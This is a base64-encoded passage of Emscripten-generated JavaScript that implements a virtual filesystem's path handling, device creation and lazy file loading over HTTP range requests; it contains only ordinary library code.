BNb2R1bGVbJ3N0ZGluJ107DQogICAgICAgIE1vZHVsZVsnc3Rkb3V0J10gPSBvdXRwdXQgfHwgTW9kdWxlWydzdGRvdXQnXTsNCiAgICAgICAgTW9kdWxlWydzdGRlcnInXSA9IGVycm9yIHx8IE1vZHVsZVsnc3RkZXJyJ107DQogIA0KICAgICAgICBGUy5jcmVhdGVTdGFuZGFyZFN0cmVhbXMoKTsNCiAgICAgIH0scXVpdDpmdW5jdGlvbigpIHsNCiAgICAgICAgRlMuaW5pdC5pbml0aWFsaXplZCA9IGZhbHNlOw0KICAgICAgICAvLyBmb3JjZS1mbHVzaCBhbGwgc3RyZWFtcywgc28gd2UgZ2V0IG11c2wgc3RkIHN0cmVhbXMgcHJpbnRlZCBvdXQNCiAgICAgICAgdmFyIGZmbHVzaCA9IE1vZHVsZVsnX2ZmbHVzaCddOw0KICAgICAgICBpZiAoZmZsdXNoKSBmZmx1c2goMCk7DQogICAgICAgIC8vIGNsb3NlIGFsbCBvZiBvdXIgc3RyZWFtcw0KICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IEZTLnN0cmVhbXMubGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICB2YXIgc3RyZWFtID0gRlMuc3RyZWFtc1tpXTsNCiAgICAgICAgICBpZiAoIXN0cmVhbSkgew0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgfQ0KICAgICAgICAgIEZTLmNsb3NlKHN0cmVhbSk7DQogICAgICAgIH0NCiAgICAgIH0sZ2V0TW9kZTpmdW5jdGlvbihjYW5SZWFkLCBjYW5Xcml0ZSkgew0KICAgICAgICB2YXIgbW9kZSA9IDA7DQogICAgICAgIGlmIChjYW5SZWFkKSBtb2RlIHw9IDI5MiB8IDczOw0KICAgICAgICBpZiAoY2FuV3JpdGUpIG1vZGUgfD0gMTQ2Ow0KICAgICAgICByZXR1cm4gbW9kZTsNCiAgICAgIH0sam9pblBhdGg6ZnVuY3Rpb24ocGFydHMsIGZvcmNlUmVsYXRpdmUpIHsNCiAgICAgICAgdmFyIHBhdGggPSBQQVRILmpvaW4uYXBwbHkobnVsbCwgcGFydHMpOw0KICAgICAgICBpZiAoZm9yY2VSZWxhdGl2ZSAmJiBwYXRoWzBdID09ICcvJykgcGF0aCA9IHBhdGguc3Vic3RyKDEpOw0KICAgICAgICByZXR1cm4gcGF0aDsNCiAgICAgIH0sYWJzb2x1dGVQYXRoOmZ1bmN0aW9uKHJlbGF0aXZlLCBiYXNlKSB7DQogICAgICAgIHJldHVybiBQQVRIX0ZTLnJlc29sdmUoYmFzZSwgcmVsYXRpdmUpOw0KICAgICAgfSxzdGFuZGFyZGl6ZVBhdGg6ZnVuY3Rpb24ocGF0aCkgew0KICAgICAgICByZXR1cm4gUEFUSC5ub3JtYWxpemUocGF0aCk7DQogICAgICB9LGZpbmRPYmplY3Q6ZnVuY3Rpb24ocGF0aCwgZG9udFJlc29sdmVMYXN0TGluaykgew0KICAgICAgICB2YXIgcmV0ID0gRlMuYW5hbHl6ZVBhdGgocGF0aCwgZG9udFJlc29sdmVMYXN0TGluayk7DQogICAgICAgIGlmIChyZXQuZXhpc3RzKSB7DQogICAgICAgICAgcmV0dXJuIHJldC5vYmplY3Q7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgc2V0RXJyTm8ocmV0LmVycm9yKTsNCiAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgfQ0KICAgICAgfSxhbmFseXplUGF0aDpmdW5jdGlvbihwYXRoLCBkb250UmVzb2x2ZUxhc3RMaW5rKSB7DQogICAgICAgIC8vIG9wZXJhdGUgZnJvbSB3aXRoaW4gdGhlIGNvbnRleHQgb2YgdGhlIHN5bWxpbmsncyB0YXJnZXQNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChwYXRoLCB7IGZvbGxvdzogIWRvbnRSZXNvbHZlTGFzdExpbmsgfSk7DQogICAgICAgICAgcGF0aCA9IGxvb2t1cC5wYXRoOw0KICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgIH0NCiAgICAgICAgdmFyIHJldCA9IHsNCiAgICAgICAgICBpc1Jvb3Q6IGZhbHNlLCBleGlzdHM6IGZhbHNlLCBlcnJvcjogMCwgbmFtZTogbnVsbCwgcGF0aDogbnVsbCwgb2JqZWN0OiBudWxsLA0KICAgICAgICAgIHBhcmVudEV4aXN0czogZmFsc2UsIHBhcmVudFBhdGg6IG51bGwsIHBhcmVudE9iamVjdDogbnVsbA0KICAgICAgICB9Ow0KICAgICAgICB0cnkgew0KICAgICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHsgcGFyZW50OiB0cnVlIH0pOw0KICAgICAgICAgIHJldC5wYXJlbnRFeGlzdHMgPSB0cnVlOw0KICAgICAgICAgIHJldC5wYXJlbnRQYXRoID0gbG9va3VwLnBhdGg7DQogICAgICAgICAgcmV0LnBhcmVudE9iamVjdCA9IGxvb2t1cC5ub2RlOw0KICAgICAgICAgIHJldC5uYW1lID0gUEFUSC5iYXNlbmFtZShwYXRoKTsNCiAgICAgICAgICBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHsgZm9sbG93OiAhZG9udFJlc29sdmVMYXN0TGluayB9KTsNCiAgICAgICAgICByZXQuZXhpc3RzID0gdHJ1ZTsNCiAgICAgICAgICByZXQucGF0aCA9IGxvb2t1cC5wYXRoOw0KICAgICAgICAgIHJldC5vYmplY3QgPSBsb29rdXAubm9kZTsNCiAgICAgICAgICByZXQubmFtZSA9IGxvb2t1cC5ub2RlLm5hbWU7DQogICAgICAgICAgcmV0LmlzUm9vdCA9IGxvb2t1cC5wYXRoID09PSAnLyc7DQogICAgICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgICByZXQuZXJyb3IgPSBlLmVycm5vOw0KICAgICAgICB9Ow0KICAgICAgICByZXR1cm4gcmV0Ow0KICAgICAgfSxjcmVhdGVGb2xkZXI6ZnVuY3Rpb24ocGFyZW50LCBuYW1lLCBjYW5SZWFkLCBjYW5Xcml0ZSkgew0KICAgICAgICB2YXIgcGF0aCA9IFBBVEguam9pbjIodHlwZW9mIHBhcmVudCA9PT0gJ3N0cmluZycgPyBwYXJlbnQgOiBGUy5nZXRQYXRoKHBhcmVudCksIG5hbWUpOw0KICAgICAgICB2YXIgbW9kZSA9IEZTLmdldE1vZGUoY2FuUmVhZCwgY2FuV3JpdGUpOw0KICAgICAgICByZXR1cm4gRlMubWtkaXIocGF0aCwgbW9kZSk7DQogICAgICB9LGNyZWF0ZVBhdGg6ZnVuY3Rpb24ocGFyZW50LCBwYXRoLCBjYW5SZWFkLCBjYW5Xcml0ZSkgew0KICAgICAgICBwYXJlbnQgPSB0eXBlb2YgcGFyZW50ID09PSAnc3RyaW5nJyA/IHBhcmVudCA6IEZTLmdldFBhdGgocGFyZW50KTsNCiAgICAgICAgdmFyIHBhcnRzID0gcGF0aC5zcGxpdCgnLycpLnJldmVyc2UoKTsNCiAgICAgICAgd2hpbGUgKHBhcnRzLmxlbmd0aCkgew0KICAgICAgICAgIHZhciBwYXJ0ID0gcGFydHMucG9wKCk7DQogICAgICAgICAgaWYgKCFwYXJ0KSBjb250aW51ZTsNCiAgICAgICAgICB2YXIgY3VycmVudCA9IFBBVEguam9pbjIocGFyZW50LCBwYXJ0KTsNCiAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgRlMubWtkaXIoY3VycmVudCk7DQogICAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgICAgLy8gaWdub3JlIEVFWElTVA0KICAgICAgICAgIH0NCiAgICAgICAgICBwYXJlbnQgPSBjdXJyZW50Ow0KICAgICAgICB9DQogICAgICAgIHJldHVybiBjdXJyZW50Ow0KICAgICAgfSxjcmVhdGVGaWxlOmZ1bmN0aW9uKHBhcmVudCwgbmFtZSwgcHJvcGVydGllcywgY2FuUmVhZCwgY2FuV3JpdGUpIHsNCiAgICAgICAgdmFyIHBhdGggPSBQQVRILmpvaW4yKHR5cGVvZiBwYXJlbnQgPT09ICdzdHJpbmcnID8gcGFyZW50IDogRlMuZ2V0UGF0aChwYXJlbnQpLCBuYW1lKTsNCiAgICAgICAgdmFyIG1vZGUgPSBGUy5nZXRNb2RlKGNhblJlYWQsIGNhbldyaXRlKTsNCiAgICAgICAgcmV0dXJuIEZTLmNyZWF0ZShwYXRoLCBtb2RlKTsNCiAgICAgIH0sY3JlYXRlRGF0YUZpbGU6ZnVuY3Rpb24ocGFyZW50LCBuYW1lLCBkYXRhLCBjYW5SZWFkLCBjYW5Xcml0ZSwgY2FuT3duKSB7DQogICAgICAgIHZhciBwYXRoID0gbmFtZSA/IFBBVEguam9pbjIodHlwZW9mIHBhcmVudCA9PT0gJ3N0cmluZycgPyBwYXJlbnQgOiBGUy5nZXRQYXRoKHBhcmVudCksIG5hbWUpIDogcGFyZW50Ow0KICAgICAgICB2YXIgbW9kZSA9IEZTLmdldE1vZGUoY2FuUmVhZCwgY2FuV3JpdGUpOw0KICAgICAgICB2YXIgbm9kZSA9IEZTLmNyZWF0ZShwYXRoLCBtb2RlKTsNCiAgICAgICAgaWYgKGRhdGEpIHsNCiAgICAgICAgICBpZiAodHlwZW9mIGRhdGEgPT09ICdzdHJpbmcnKSB7DQogICAgICAgICAgICB2YXIgYXJyID0gbmV3IEFycmF5KGRhdGEubGVuZ3RoKTsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBsZW4gPSBkYXRhLmxlbmd0aDsgaSA8IGxlbjsgKytpKSBhcnJbaV0gPSBkYXRhLmNoYXJDb2RlQXQoaSk7DQogICAgICAgICAgICBkYXRhID0gYXJyOw0KICAgICAgICAgIH0NCiAgICAgICAgICAvLyBtYWtlIHN1cmUgd2UgY2FuIHdyaXRlIHRvIHRoZSBmaWxlDQogICAgICAgICAgRlMuY2htb2Qobm9kZSwgbW9kZSB8IDE0Nik7DQogICAgICAgICAgdmFyIHN0cmVhbSA9IEZTLm9wZW4obm9kZSwgJ3cnKTsNCiAgICAgICAgICBGUy53cml0ZShzdHJlYW0sIGRhdGEsIDAsIGRhdGEubGVuZ3RoLCAwLCBjYW5Pd24pOw0KICAgICAgICAgIEZTLmNsb3NlKHN0cmVhbSk7DQogICAgICAgICAgRlMuY2htb2Qobm9kZSwgbW9kZSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIG5vZGU7DQogICAgICB9LGNyZWF0ZURldmljZTpmdW5jdGlvbihwYXJlbnQsIG5hbWUsIGlucHV0LCBvdXRwdXQpIHsNCiAgICAgICAgdmFyIHBhdGggPSBQQVRILmpvaW4yKHR5cGVvZiBwYXJlbnQgPT09ICdzdHJpbmcnID8gcGFyZW50IDogRlMuZ2V0UGF0aChwYXJlbnQpLCBuYW1lKTsNCiAgICAgICAgdmFyIG1vZGUgPSBGUy5nZXRNb2RlKCEhaW5wdXQsICEhb3V0cHV0KTsNCiAgICAgICAgaWYgKCFGUy5jcmVhdGVEZXZpY2UubWFqb3IpIEZTLmNyZWF0ZURldmljZS5tYWpvciA9IDY0Ow0KICAgICAgICB2YXIgZGV2ID0gRlMubWFrZWRldihGUy5jcmVhdGVEZXZpY2UubWFqb3IrKywgMCk7DQogICAgICAgIC8vIENyZWF0ZSBhIGZha2UgZGV2aWNlIHRoYXQgYSBzZXQgb2Ygc3RyZWFtIG9wcyB0byBlbXVsYXRlDQogICAgICAgIC8vIHRoZSBvbGQgYmVoYXZpb3IuDQogICAgICAgIEZTLnJlZ2lzdGVyRGV2aWNlKGRldiwgew0KICAgICAgICAgIG9wZW46IGZ1bmN0aW9uKHN0cmVhbSkgew0KICAgICAgICAgICAgc3RyZWFtLnNlZWthYmxlID0gZmFsc2U7DQogICAgICAgICAgfSwNCiAgICAgICAgICBjbG9zZTogZnVuY3Rpb24oc3RyZWFtKSB7DQogICAgICAgICAgICAvLyBmbHVzaCBhbnkgcGVuZGluZyBsaW5lIGRhdGENCiAgICAgICAgICAgIGlmIChvdXRwdXQgJiYgb3V0cHV0LmJ1ZmZlciAmJiBvdXRwdXQuYnVmZmVyLmxlbmd0aCkgew0KICAgICAgICAgICAgICBvdXRwdXQoMTApOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0sDQogICAgICAgICAgcmVhZDogZnVuY3Rpb24oc3RyZWFtLCBidWZmZXIsIG9mZnNldCwgbGVuZ3RoLCBwb3MgLyogaWdub3JlZCAqLykgew0KICAgICAgICAgICAgdmFyIGJ5dGVzUmVhZCA9IDA7DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGxlbmd0aDsgaSsrKSB7DQogICAgICAgICAgICAgIHZhciByZXN1bHQ7DQogICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgcmVzdWx0ID0gaW5wdXQoKTsNCiAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDI5KTsNCiAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICBpZiAocmVzdWx0ID09PSB1bmRlZmluZWQgJiYgYnl0ZXNSZWFkID09PSAwKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNik7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgaWYgKHJlc3VsdCA9PT0gbnVsbCB8fCByZXN1bHQgPT09IHVuZGVmaW5lZCkgYnJlYWs7DQogICAgICAgICAgICAgIGJ5dGVzUmVhZCsrOw0KICAgICAgICAgICAgICBidWZmZXJbb2Zmc2V0K2ldID0gcmVzdWx0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKGJ5dGVzUmVhZCkgew0KICAgICAgICAgICAgICBzdHJlYW0ubm9kZS50aW1lc3RhbXAgPSBEYXRlLm5vdygpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGJ5dGVzUmVhZDsNCiAgICAgICAgICB9LA0KICAgICAgICAgIHdyaXRlOiBmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvcykgew0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBsZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIG91dHB1dChidWZmZXJbb2Zmc2V0K2ldKTsNCiAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDI5KTsNCiAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKGxlbmd0aCkgew0KICAgICAgICAgICAgICBzdHJlYW0ubm9kZS50aW1lc3RhbXAgPSBEYXRlLm5vdygpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGk7DQogICAgICAgICAgfQ0KICAgICAgICB9KTsNCiAgICAgICAgcmV0dXJuIEZTLm1rZGV2KHBhdGgsIG1vZGUsIGRldik7DQogICAgICB9LGNyZWF0ZUxpbms6ZnVuY3Rpb24ocGFyZW50LCBuYW1lLCB0YXJnZXQsIGNhblJlYWQsIGNhbldyaXRlKSB7DQogICAgICAgIHZhciBwYXRoID0gUEFUSC5qb2luMih0eXBlb2YgcGFyZW50ID09PSAnc3RyaW5nJyA/IHBhcmVudCA6IEZTLmdldFBhdGgocGFyZW50KSwgbmFtZSk7DQogICAgICAgIHJldHVybiBGUy5zeW1saW5rKHRhcmdldCwgcGF0aCk7DQogICAgICB9LGZvcmNlTG9hZEZpbGU6ZnVuY3Rpb24ob2JqKSB7DQogICAgICAgIGlmIChvYmouaXNEZXZpY2UgfHwgb2JqLmlzRm9sZGVyIHx8IG9iai5saW5rIHx8IG9iai5jb250ZW50cykgcmV0dXJuIHRydWU7DQogICAgICAgIHZhciBzdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgaWYgKHR5cGVvZiBYTUxIdHRwUmVxdWVzdCAhPT0gJ3VuZGVmaW5lZCcpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoIkxhenkgbG9hZGluZyBzaG91bGQgaGF2ZSBiZWVuIHBlcmZvcm1lZCAoY29udGVudHMgc2V0KSBpbiBjcmVhdGVMYXp5RmlsZSwgYnV0IGl0IHdhcyBub3QuIExhenkgbG9hZGluZyBvbmx5IHdvcmtzIGluIHdlYiB3b3JrZXJzLiBVc2UgLS1lbWJlZC1maWxlIG9yIC0tcHJlbG9hZC1maWxlIGluIGVtY2Mgb24gdGhlIG1haW4gdGhyZWFkLiIpOw0KICAgICAgICB9IGVsc2UgaWYgKHJlYWRfKSB7DQogICAgICAgICAgLy8gQ29tbWFuZC1saW5lLg0KICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAvLyBXQVJOSU5HOiBDYW4ndCByZWFkIGJpbmFyeSBmaWxlcyBpbiBWOCdzIGQ4IG9yIHRyYWNlbW9ua2V5J3MganMsIGFzDQogICAgICAgICAgICAvLyAgICAgICAgICByZWFkKCkgd2lsbCB0cnkgdG8gcGFyc2UgVVRGOC4NCiAgICAgICAgICAgIG9iai5jb250ZW50cyA9IGludEFycmF5RnJvbVN0cmluZyhyZWFkXyhvYmoudXJsKSwgdHJ1ZSk7DQogICAgICAgICAgICBvYmoudXNlZEJ5dGVzID0gb2JqLmNvbnRlbnRzLmxlbmd0aDsNCiAgICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICBzdWNjZXNzID0gZmFsc2U7DQogICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgIHRocm93IG5ldyBFcnJvcignQ2Fubm90IGxvYWQgd2l0aG91dCByZWFkKCkgb3IgWE1MSHR0cFJlcXVlc3QuJyk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFzdWNjZXNzKSBzZXRFcnJObygyOSk7DQogICAgICAgIHJldHVybiBzdWNjZXNzOw0KICAgICAgfSxjcmVhdGVMYXp5RmlsZTpmdW5jdGlvbihwYXJlbnQsIG5hbWUsIHVybCwgY2FuUmVhZCwgY2FuV3JpdGUpIHsNCiAgICAgICAgLy8gTGF6eSBjaHVua2VkIFVpbnQ4QXJyYXkgKGltcGxlbWVudHMgZ2V0IGFuZCBsZW5ndGggZnJvbSBVaW50OEFycmF5KS4gQWN0dWFsIGdldHRpbmcgaXMgYWJzdHJhY3RlZCBhd2F5IGZvciBldmVudHVhbCByZXVzZS4NCiAgICAgICAgLyoqIEBjb25zdHJ1Y3RvciAqLw0KICAgICAgICBmdW5jdGlvbiBMYXp5VWludDhBcnJheSgpIHsNCiAgICAgICAgICB0aGlzLmxlbmd0aEtub3duID0gZmFsc2U7DQogICAgICAgICAgdGhpcy5jaHVua3MgPSBbXTsgLy8gTG9hZGVkIGNodW5rcy4gSW5kZXggaXMgdGhlIGNodW5rIG51bWJlcg0KICAgICAgICB9DQogICAgICAgIExhenlVaW50OEFycmF5LnByb3RvdHlwZS5nZXQgPSAvKiogQHRoaXN7T2JqZWN0fSAqLyBmdW5jdGlvbiBMYXp5VWludDhBcnJheV9nZXQoaWR4KSB7DQogICAgICAgICAgaWYgKGlkeCA+IHRoaXMubGVuZ3RoLTEgfHwgaWR4IDwgMCkgew0KICAgICAgICAgICAgcmV0dXJuIHVuZGVmaW5lZDsNCiAgICAgICAgICB9DQogICAgICAgICAgdmFyIGNodW5rT2Zmc2V0ID0gaWR4ICUgdGhpcy5jaHVua1NpemU7DQogICAgICAgICAgdmFyIGNodW5rTnVtID0gKGlkeCAvIHRoaXMuY2h1bmtTaXplKXwwOw0KICAgICAgICAgIHJldHVybiB0aGlzLmdldHRlcihjaHVua051bSlbY2h1bmtPZmZzZXRdOw0KICAgICAgICB9Ow0KICAgICAgICBMYXp5VWludDhBcnJheS5wcm90b3R5cGUuc2V0RGF0YUdldHRlciA9IGZ1bmN0aW9uIExhenlVaW50OEFycmF5X3NldERhdGFHZXR0ZXIoZ2V0dGVyKSB7DQogICAgICAgICAgdGhpcy5nZXR0ZXIgPSBnZXR0ZXI7DQogICAgICAgIH07DQogICAgICAgIExhenlVaW50OEFycmF5LnByb3RvdHlwZS5jYWNoZUxlbmd0aCA9IGZ1bmN0aW9uIExhenlVaW50OEFycmF5X2NhY2hlTGVuZ3RoKCkgew0KICAgICAgICAgIC8vIEZpbmQgbGVuZ3RoDQogICAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICAgIHhoci5vcGVuKCdIRUFEJywgdXJsLCBmYWxzZSk7DQogICAgICAgICAgeGhyLnNlbmQobnVsbCk7DQogICAgICAgICAgaWYgKCEoeGhyLnN0YXR1cyA+PSAyMDAgJiYgeGhyLnN0YXR1cyA8IDMwMCB8fCB4aHIuc3RhdHVzID09PSAzMDQpKSB0aHJvdyBuZXcgRXJyb3IoIkNvdWxkbid0IGxvYWQgIiArIHVybCArICIuIFN0YXR1czogIiArIHhoci5zdGF0dXMpOw0KICAgICAgICAgIHZhciBkYXRhbGVuZ3RoID0gTnVtYmVyKHhoci5nZXRSZXNwb25zZUhlYWRlcigiQ29udGVudC1sZW5ndGgiKSk7DQogICAgICAgICAgdmFyIGhlYWRlcjsNCiAgICAgICAgICB2YXIgaGFzQnl0ZVNlcnZpbmcgPSAoaGVhZGVyID0geGhyLmdldFJlc3BvbnNlSGVhZGVyKCJBY2NlcHQtUmFuZ2VzIikpICYmIGhlYWRlciA9PT0gImJ5dGVzIjsNCiAgICAgICAgICB2YXIgdXNlc0d6aXAgPSAoaGVhZGVyID0geGhyLmdldFJlc3BvbnNlSGVhZGVyKCJDb250ZW50LUVuY29kaW5nIikpICYmIGhlYWRlciA9PT0gImd6aXAiOw0KICANCiAgICAgICAgICB2YXIgY2h1bmtTaXplID0gMTAyNCoxMDI0OyAvLyBDaHVuayBzaXplIGluIGJ5dGVzDQogIA0KICAgICAgICAgIGlmICghaGFzQnl0ZVNlcnZpbmcpIGNodW5rU2l6ZSA9IGRhdGFsZW5ndGg7DQogIA0KICAgICAgICAgIC8vIEZ1bmN0aW9uIHRvIGdldCBhIHJhbmdlIGZyb20gdGhlIHJlbW90ZSBVUkwuDQogICAgICAgICAgdmFyIGRvWEhSID0gKGZ1bmN0aW9uKGZyb20sIHRvKSB7DQogICAgICAgICAgICBpZiAoZnJvbSA+IHRvKSB0aHJvdyBuZXcgRXJyb3IoImludmFsaWQgcmFuZ2UgKCIgKyBmcm9tICsgIiwgIiArIHRvICsgIikgb3Igbm8gYnl0ZXMgcmVxdWVzdGVkISIpOw0KICAgICAgICAgICAgaWYgKHRvID4gZGF0YWxlbmd0aC0xKSB0aHJvdyBuZXcgRXJyb3IoIm9ubHkgIiArIGRhdGFsZW5ndGggKyAiIGJ5dGVzIGF2YWlsYWJsZSEgcHJvZ3JhbW1lciBlcnJvciEiKTsNCiAgDQogICAgICAgICAgICAvLyBUT0RPOiBVc2UgbW96UmVzcG9uc2VBcnJheUJ1ZmZlciwgcmVzcG9uc2VTdHJlYW0sIGV0Yy4gaWYgYXZhaWxhYmxlLg0KICAgICAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICAgICAgeGhyLm9wZW4oJ0dFVCcsIHVybCwgZmFsc2UpOw0KICAgICAgICAgICAgaWYgKGRhdGFsZW5ndGggIT09IGNodW5rU2l6ZSkgeGhyLnNldFJlcXVlc3RIZWFkZXIoIlJhbmdlIiwgImJ5dGVzPSIgKyBmcm9tICsgIi0iICsgdG8pOw0KICANCiAgICAgICAgICAgIC8vIFNvbWUgaGludHMgdG8gdGhlIGJyb3dzZXIgdGhhdCB3ZSB3YW50IGJpbmFyeSBkYXRhLg0KICAgICAgICAgICAgaWYgKHR5cGVvZiBVaW50OEFycmF5ICE9ICd1bmRlZmluZWQnKSB4aHIucmVzcG9uc2VUeXBlID0gJ2FycmF5YnVmZmVyJzsNCiAgICAgICAgICAgIGlmICh4aHIub3ZlcnJpZGVNaW1lVHlwZSkgew0KICAgICAgICAgICAgICB4aHIub3ZlcnJpZGVNaW1lVHlwZSgndGV4dC9wbGFpbjsgY2hhcnNldD14LXVzZXItZGVmaW5lZCcpOw0KICAgICAgICAgICAgfQ0KICANCiAgICAgICAgICAgIHhoci5zZW5kKG51bGwpOw0KICAgICAgICAgICAgaWYgKCEoeGhyLnN0YXR1cyA+PSAyMDAgJiYgeGhyLnN0YXR1cyA8IDMwMCB8fCB4aHIuc3RhdHVzID09PSAzMDQpKSB0aHJvdyBuZXcgRXJyb3IoIkNvdWxkbid0IGxvYWQgIiArIHVybCArICIuIFN0YXR1czogIiArIHhoci5zdGF0dXMpOw0KICAgICAgICAgICAgaWYgKHhoci5yZXNwb25zZSAhPT0gdW5kZWZpbmVkKSB7DQogICAgICAgICAgICAgIHJldHVybiBuZXcgVWludDhBcnJheSgvKiogQHR5cGV7QXJyYXk8bnVtYmVyPn0gKi8oeGhyLnJlc3BvbnNlIHx8IFtdKSk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICByZXR1cm4gaW50QXJyYXlGcm9tU3RyaW5nKHhoci5yZXNwb25zZVRleHQgfHwgJycsIHRydWUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0pOw0KICAgICAgICAgIHZhciBsYXp5QXJyYXkgPSB0aGlzOw0KICAgICAgICAgIGxhenlBcnJheS5zZXREYXRhR2V0dGVyKGZ1bmN0aW9uKGNodW5rTnVtKSB7DQogICAgICAgICAgICB2YXIgc3RhcnQgPSBjaHVua051bSAqIGNodW5rU2l6ZTsNCiAgICAgICAgICAgIHZhciBlbmQgPSAoY2h1bmtOdW0rMSkgKiBjaHVua1NpemUgLSAxOyAvLyBpbmNsdWRpbmcgdGhpcyBieXRlDQogICAgICAgICAgICBlbmQgPSBNYXRoLm1pbihlbmQsIGRhdGFsZW5ndGgtMSk7IC8vIGlmIGRhdGFsZW5ndGgtMSBpcyBzZWxlY3RlZCwgdGhpcyBpcyB0aGUgbGFzdCBibG9jaw0KICAgICAgICAgICAgaWYgKHR5cGVvZihsYXp5QXJyYXkuY2h1bmtzW2NodW5rTnVtXSkgPT09ICJ1bmRlZmluZWQiKSB7DQogICAgICAgICAgICAgIGxhenlBcnJheS5jaHVua3NbY2h1bmtOdW1dID0gZG9YSFIoc3RhcnQsIGVuZCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAodHlwZW9mKGxhenlBcnJheS5jaHVua3NbY2h1bmtOdW1dKSA9PT0gInVuZGVmaW5lZCIpIHRocm93IG5ldyBFcnJvcigiZG9YSFIgZmFpbGVkISIpOw0KICAgICAgICAgICAgcmV0dXJuIGxhenlBcnJheS5jaHVua3NbY2h1bmtOdW1dOw0KICAgICAgICAgIH0pOw0KICANCiAgICAgICAgICBpZiAodXNlc0d6aXAgfHwgIWRhdGFsZW5ndGgpIHsNCiAgICAgICAgICAgIC8vIGlmIHRoZSBzZXJ2ZXIgdXNlcyBnemlwIG9yIGRvZXNuJ3Qgc3VwcGx5IHRoZSBsZW5ndGgsIHdlIGhhdmUgdG8gZG93bmxvYWQgdGhlIHdob2xlIGZpbGUgdG8gZ2V0IHRoZSAodW5jb21wcmVzc2VkKSBsZW5ndGgNCiAgICAgICAgICAgIGNodW5rU2l6ZSA9IGRhdGFsZW5ndGggPSAxOyAvLyB0aGlzIHdpbGwgZm9yY2UgZ2V0dGVyKDApL2RvWEhSIGRvIGRvd25sb2FkIHRoZSB3aG9sZSBmaWxlDQogICAgICAgICAgICBkYXRhbGVuZ3RoID0gdGhpcy5nZXR0ZXIoMCkubGVuZ3RoOw0KICAgICAgICAgICAgY2h1bmtTaXplID0gZGF0YWxlbmd0aDsNCiAgICAgICAgICAgIG91dCgiTGF6eUZpbGVzIG9uIGd6aXAgZm9yY2VzIGRvd25sb2FkIG9mIHRoZSB3aG9sZSBmaWxlIHdoZW4gbGVuZ3RoIGlzIGFjY2Vzc2VkIik7DQogICAgICAgICAgfQ0KICANCiAgICAgICAgICB0aGlzLl9sZW5ndGggPSBkYXRhbGVuZ3RoOw0KICAgICAgICAgIHRoaXMuX2NodW5rU2l6ZSA9IGNodW5rU2l6ZTsNCiAgICAgICAgICB0aGlzLmxlbmd0aEtub3duID0gdHJ1ZTsNCiAgICAgICAgfTsNCiAgICAgICAgaWYgKHR5cGVvZiBYTUxIdHRwUmVxdWVzdCAhPT0gJ3VuZGVmaW5lZCcpIHsNCiAgICAgICAgICBpZiAoIUVOVklST05NRU5UX0lTX1dPUktFUikgdGhyb3cgJ0Nhbm5vdCBkbyBzeW5jaHJvbm91cyBiaW5hcnkgWEhScyBvdXRzaWRlIHdlYndvcmtlcnMgaW4gbW9kZXJuIGJyb3dzZXJzLiBVc2UgLS1lbWJlZC1maWxlIG9yIC0tcHJlbG9hZC1maWxlIGluIGVtY2MnOw0KICAgICAgICAgIHZhciBsYXp5QXJyYXkgPSBuZXcgTGF6eVVpbnQ4QXJyYXkoKTsNCiAgICAgICAgICBPYmplY3QuZGVmaW5lUHJvcGVydGllcyhsYXp5QXJyYXksIHsNCiAgICAgICAgICAgIGxlbmd0aDogew0KICAgICAgICAgICAgICBnZXQ6IC8qKiBAdGhpc3tPYmplY3R9ICovIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgIGlmKCF0aGlzLmxlbmd0aEtub3duKSB7DQogICAgICAgICAgICAgICAgICB0aGlzLmNhY2hlTGVuZ3RoKCk7DQogICAgICAgICAgICAgICAgfQ0KIC